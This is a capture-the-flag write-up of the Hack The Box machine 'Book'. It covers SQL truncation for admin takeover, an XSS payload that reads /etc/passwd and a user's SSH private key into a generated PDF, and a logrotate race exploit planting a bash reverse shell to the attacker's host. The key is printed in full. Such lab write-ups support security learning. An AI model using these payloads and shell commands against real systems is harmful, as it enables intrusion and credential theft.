---
path: "/htb-book"
title: "Hack The Box - Book"
date: "07/12/2020"
featuredImage: ../../images/book.png
tags: ["pentesting", "hackthebox", "linux"]
---

Book left me with a lot of mix feelings. There was a lot of frustration as the attacker vectors were new for me, but also I was happy with adding them to my arsenal.

Start things off with an NMAP scan. This revealed that the only 2 ports opened are 22 and 80.

```
nmap -A -p- -T4 -oA Nmap/all -Pn 10.10.10.176
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 20:34 EDT
Warning: 10.10.10.176 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.176
Host is up (0.17s latency).
Not shown: 65382 closed ports, 151 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This maps out the path to exploiting this box. We will need to compromise the server via the web-server and potentially pivot to using SSH based on the goodies we can find.

Visiting the site on port 80, it presents you with a login page.

![Landing Page](../../images/book/landingpage.png)

Gobuster also reveals that there is an admin portal at “/admin”. Admin credential is need to login. Going back to user login, we can create an account as a regular user and start poking around.

![Homepage](../../images/book/homepage.png)

From the contact page you can see that the admin’s email is “admin@book.htb”. Also from the collections, a user can upload a book. There is not much to do from here on. The effort now is to pivot to the admin account. For this back to the login page.

Inspecting the login page, you can see the Frontend validation for the login page.

```js
function validateForm() {
  var x = document.forms["myForm"]["name"].value
  var y = document.forms["myForm"]["email"].value
  if (x == "") {
    alert("Please fill name field. Should not be more than 10 characters")
    return false
  }
  if (y == "") {
    alert("Please fill email field. Should not be more than 20 characters")
    return false
  }
}
```

At first sight this did not show much potential to me, but after much goggling I stumble on SQL Truncation vulnerability. The gist of this vulnerability is that when a string cannot fit into a set length, it is truncated when saved to the database; if a MySQL db is used. If the application server does validation to see if the string exist it will return false. In this case, you pass the admin email padded with a lot of space and terminated with a character to prevent any white space stripping that might occur.

![Burp](../../images/book/burp.png)

From here on we can login as the admin in the admin portal using the password “jdoee”.

![Admin Panel](../../images/book/admin-panel.png)

From the admin portal we can generate a list of all book entries with Author and title. This list is exported as a pdf.

From the user portal, we can add a book with it’s author and title. We can perform a local file read base on the technique described in this article. If html is posted as the title, it will be evaluated. Following technique described in the mentioned article, we can grab the contents of the passwd file. Fill the form with the following values and any file uploaded.

```
Book Title: <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>

Author: <anything>
```

From the admin portal, we can get the list of collectible which in the case will have the contents of the passwd file.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-
data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats
Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-
network:x:100:102:systemd Network
Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-
resolve:x:101:103:systemd
Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
reader:x:1000:1000:reader:/home/reader:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
```

From here we can find users to pivot to. From the list, “reader” shows potential. We can retrieve the SSH key of this user using the same method as the passwd.

```
Book Title: <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText.fontsize(0.5))};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
```

The same process as before, we retrieve the key from the generated pdf from the admin portal.

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0
WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0
ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s
7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK
75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7
3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+
McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI
tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ
jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz
7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6
GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL
E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/
ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+
SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l
skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V
o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m
Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC
hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u
Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh
sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf
tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi
5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW
y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN
nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=
-----END RSA PRIVATE KEY-----
```

This key can be used to ssh as the user reader.

Efforts can now be shifted to elevating to the “root” account. From running linpeas enumeration scripts you will see that this machine is vulnerable to the logrotate exploitation.

> There is a vulnerability on logrotatethat allows a user with write permissions over a log file or any of its parent directories to make logrotatewrite a file in any location. If logrotate is being executed by root, then the user will be able to write any file in /etc/bash_completion.d/ that will be executed by any user that login.

This vulnerability is base on a race condition in logrotate. To exploit this vulnerability, we will use logrotten. The payload in this case will be create a reverse shell.

```
payloadfile

if [ `id -u` -eq 0 ]; then nohup bash -c 'bash -i >& /dev/tcp/10.10.14.3/1337 0>&1'; fi
```

As a validation step, you can check the contents of “/etc/bash_completion.d”

```
reader@book:/etc/bash_completion.d$ ll
total 36
drwxr-xr-x  2 root root  4096 Feb 19 14:10 ./
drwxr-xr-x 99 root root  4096 Feb 19 14:09 ../
-rw-r--r--  1 root root  6636 Nov 20  2017 apport_completion
-rw-r--r--  1 root root  3211 Oct  2  2018 cloud-init
-rw-r--r--  1 root root   439 Nov 26  2018 git-prompt
-rw-r--r--  1 root root 11144 Mar 18  2019 grub
```

Now we execute the exploit as follows

`./logrotten -p payloadfile /home/reader/backups/access.log`

The execution will hang listening for a change in “access.log". This can be achieved by writing to this file.

`echo blah > /home/reader/backups/access.log`

The exploit will continue execution after this. To validate the exploit, check the contents again of “/etc/bash_completion.d/”. It should contain “access.log” and its content should be the payload.

```
reader@book:/etc/bash_completion.d$ ll
total 40
drwxr-xr-x  2 root   root    4096 Jul 12 17:31 ./
drwxr-xr-x 99 root   root    4096 Feb 19 14:09 ../
-r-xr-xr-x  1 reader reader    89 Jul 12 17:31 access.log*
-rw-r--r--  1 root   root    6636 Nov 20  2017 apport_completion
-rw-r--r--  1 root   root    3211 Oct  2  2018 cloud-init
-rw-r--r--  1 root   root     439 Nov 26  2018 git-prompt
-rw-r--r--  1 root   root   11144 Mar 18  2019 grub
reader@book:/etc/bash_completion.d$ cat access.log
if [ `id -u` -eq 0 ]; then nohup bash -c 'bash -i >& /dev/tcp/10.10.14.23/1337 0>&1'; fi
```

Now we wait for a root login and we will get a reverse shell.

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.176] 56856
root@book:~# ls
ls
clean_backup.sh
clean.sh
cron_root
log.cfg
log.sh
nohup.out
reset.sh
root.txt
```

That wraps up this box. Till the next one.
